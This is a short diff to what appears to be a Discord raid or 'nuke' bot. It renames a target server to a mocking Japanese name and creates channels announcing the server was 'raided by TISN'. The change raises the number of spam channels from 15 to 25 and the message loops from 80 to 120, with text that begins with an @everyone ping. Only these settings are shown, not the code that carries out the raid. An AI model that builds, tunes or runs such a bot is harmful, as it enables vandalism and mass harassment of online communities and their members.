@@ -13,8 +13,8 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 SERVER_NAME = "トイ神の植民地"
 CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
-CHANNEL_COUNT = 15
-MESSAGE_LOOPS = 80
+CHANNEL_COUNT = 25
+MESSAGE_LOOPS = 120
 
 COMBINED_TEXT = (
     "@everyone\n"
